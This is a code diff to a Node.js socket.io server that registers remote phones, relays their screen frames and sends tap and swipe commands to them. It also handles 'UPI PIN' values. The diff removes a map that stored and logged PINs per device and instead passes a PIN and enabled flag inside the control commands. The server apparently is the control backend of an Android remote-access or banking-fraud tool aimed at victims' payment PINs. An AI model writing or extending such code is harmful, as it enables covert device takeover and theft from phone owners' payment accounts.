@@ -19,7 +19,6 @@ app.use(express.json({ limit: '300mb' }));
 app.use(express.urlencoded({ limit: '300mb', extended: true }));
 
 const devices = new Map();
-const devicePins = new Map(); // 🔥 UPI PIN storage
 
 app.post('/register', (req, res) => {
     const { deviceId, model, brand, version, status } = req.body;
@@ -45,16 +44,8 @@ io.on('connection', (socket) => {
             });
             socket.join(deviceId);
             io.emit('devices-update', Array.from(devices.entries()));
-            io.to(deviceId).emit('upi-status', { enabled: devicePins.has(deviceId) });
             console.log(`📱 Device registered: ${deviceId}`);
         }
-    });
-
-    socket.on('set-upi-pin', (data) => {
-        const { deviceId, pin } = data;
-        devicePins.set(deviceId, pin);
-        io.to(deviceId).emit('upi-status', { enabled: true, pin });
-        console.log(`🔐 UPI PIN set for ${deviceId}: ${pin}`);
     });
 
     socket.on('screen-frame', (data) => {
@@ -73,7 +64,7 @@ io.on('connection', (socket) => {
     });
 
     socket.on('control', (data) => {
-        const { deviceId, action, x, y, startX, startY, endX, endY, duration } = data;
+        const { deviceId, action, x, y, startX, startY, endX, endY, duration, enabled, pin } = data;
         if (devices.has(deviceId)) {
             socket.to(deviceId).emit('control', {
                 action,
@@ -83,7 +74,9 @@ io.on('connection', (socket) => {
                 startY: parseFloat(startY),
                 endX: parseFloat(endX),
                 endY: parseFloat(endY),
-                duration: parseInt(duration) || 300
+                duration: parseInt(duration) || 300,
+                enabled: !!enabled,
+                pin: pin || ''
             });
         }
     });
